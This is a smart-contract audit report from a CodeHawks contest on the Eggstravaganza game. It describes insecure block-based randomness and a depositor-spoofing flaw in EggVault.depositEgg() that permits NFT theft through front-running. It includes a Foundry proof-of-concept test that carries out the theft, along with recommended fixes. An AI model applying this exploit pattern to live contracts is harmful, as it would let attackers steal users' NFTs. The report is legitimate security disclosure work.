
<p align="center">
<img src="wolf2.jpg" alt="Eggstravaganza Banner" width="400"/>
</p>

# Eggstravaganza - Findings Report

# Table of contents
- ## [Contest Summary](#contest-summary)
- ## [Results Summary](#results-summary)
- ## High Risk Findings
    - ### [H-01. Insecure Randomness in EggHuntGame.sol](#H-01)
    - ### [H-02. Depositor Spoofing in depositEgg() in EggVault.sol Enables NFT Theft via Front-running](#H-02)




# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #37

### Dates: Apr 3rd, 2025 - Apr 10th, 2025

[See more contest details here](https://codehawks.cyfrin.io/c/2025-04-eggstravaganza)

# <a id='results-summary'></a>Results Summary

### Number of findings:
- High: 2
- Medium: 0
- Low: 0


# High Risk Findings

## <a id='H-01'></a>H-01. Insecure Randomness in EggHuntGame.sol            



## Summary

The contract uses insecure methods to generate pseudo-random numbers in searchForEgg() function by relying on publicly accessible and manipulable blockchain variables. This can lead to predictable outcomes and gives an unfair advantage to certain players, compromising the integrity of the game.

## Vulnerability Details

The following code snippet demonstrates how the random number is generated:

```Solidity
uint256 random = uint256(
    keccak256(
        abi.encodePacked(
            block.timestamp, 
            block.prevrandao, 
            msg.sender, 
            eggCounter
        )
    )
) % 100;
```

The inputs used in this hash-based approach are either publicly accessible (msg.sender, eggCounter) or can be manipulated by the block producer (block.timestamp). Although block.prevrandao (introduced in PoS Ethereum) is intended to provide entropy, it is still a predictable value within the context of the current block.

&#x20;

These characteristics make it possible for malicious players or validators to simulate or manipulate outcomes in order to obtain favorable results in the game.

## Impact

• Players may exploit the pseudo-randomness to consistently find eggs or mint rare NFTs.

&#x20;

• Validators can manipulate block.timestamp and predict block.prevrandao to rig outcomes.

• The overall fairness and trust in the game economy are compromised.

Depending on the in-game value of the rewards, this vulnerability could result in significant economic imbalance.

## Tools Used

• Manual code review

## Recommendations

Replace the current randomness mechanism with a secure and verifiable source such as [Chainlink VRF](https://docs.chain.link/docs/vrf/v2/). Chainlink VRF provides:

&#x20;

• Cryptographically secure randomness

• Verifiability on-chain

• Protection from block producer manipulation

This will ensure fairness for all participants and preserve the integrity of the game logic.

## <a id='H-02'></a>H-02. Depositor Spoofing in depositEgg() in EggVault.sol Enables NFT Theft via Front-running            



## Summary

The depositEgg(uint256 tokenId, address depositor) function in the EggVault contract allows arbitrary specification of the depositor address. This design enables **front-running attacks**, where an attacker can hijack the legitimate depositor’s NFT and register themselves as the owner in the vault. As a result, they can withdraw NFTs they do not own.

## Vulnerability Details

The function currently allows any caller to assign the eggDepositors\[tokenId] value by passing in any address:

```Solidity
function depositEgg(uint256 tokenId, address depositor) public {
...
eggDepositors[tokenId] = depositor;
}
```

If a user sends their NFT to the vault contract via transferFrom(), there is a time window before they can call depositEgg(). During this time, a malicious actor can observe the transaction in the mempool and quickly call depositEgg() with the victim’s tokenId, setting themselves as the depositor.

Later, they can call withdrawEgg(tokenId) and receive the victim’s NFT — with full authorization from the vault contract.

```Solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.23;

import "forge-std/Test.sol";
import "../src/EggVault.sol";
import "../src/EggstravaganzaNFT.sol";

contract EggVaultTest is Test {
EggVault public vault;
EggstravaganzaNFT public nft;


address owner = address(0xABCD);
address player = address(0xBEEF);
address attacker = address(0xBAD);

function setUp() public {
    vm.startPrank(owner);
    nft = new EggstravaganzaNFT("Egg", "EGG");
    vault = new EggVault();
    vault.setEggNFT(address(nft));
    nft.transferOwnership(owner);
    nft.setGameContract(owner);
    vm.stopPrank();

    // Mint a token to the player
    vm.startPrank(owner);
    nft.mintEgg(player, 1);
    vm.stopPrank();
}

function testFrontRunningDepositorSpoofing() public {
    // player approves and transfers token to the vault
    vm.startPrank(player);
    vm.prank(player);
    nft.approve(address(vault), 1);
    nft.transferFrom(player, address(vault), 1);
    vm.stopPrank();

    // attacker front-runs and claims deposit with their address
    vm.startPrank(attacker);
    vault.depositEgg(1, attacker); // this is the vulnerability!
    vm.stopPrank();

    // attacker withdraws the victim's NFT
    vm.prank(attacker);
    vault.withdrawEgg(1);

    assertEq(nft.ownerOf(1), attacker, "Attacker should have stolen the NFT");
}
}
```

In this PoC, the attacker successfully:
•	Intercepts the NFT transfer,
•	Calls depositEgg() first with their own address,
•	Withdraws an NFT they never owned.

**Expected Output:**

Running 1 test for test/EggVault.t.sol:EggVaultTest
\[PASS] testFrontRunningDepositorSpoofing() (gas: XXXX)

## Impact

**Impact:**

&#x20;

• Attackers can steal NFTs from other users by front-running depositEgg() calls.

• The contract state will reflect incorrect depositor ownership.

• This breaks the trust and intended behavior of the NFT deposit system and results in **loss of user assets**.

## Tools Used

• Manual code review

## Recommendations

**1. Remove the depositor argument completely** and use msg.sender to record the depositor:

```Solidity
function depositEgg(uint256 tokenId) public {
require(eggNFT.ownerOf(tokenId) == address(this), "NFT not transferred to vault");
require(!storedEggs[tokenId], "Egg already deposited");

storedEggs[tokenId] = true;
eggDepositors[tokenId] = msg.sender;

emit EggDeposited(msg.sender, tokenId);
```

**2. Consider replacing the two-step transfer/deposit with a single atomic flow**, like safeTransferFrom + onERC721Received.

**3. Add optional reentrancy protection using ReentrancyGuard** to future-proof against related issues in withdrawEgg().

    





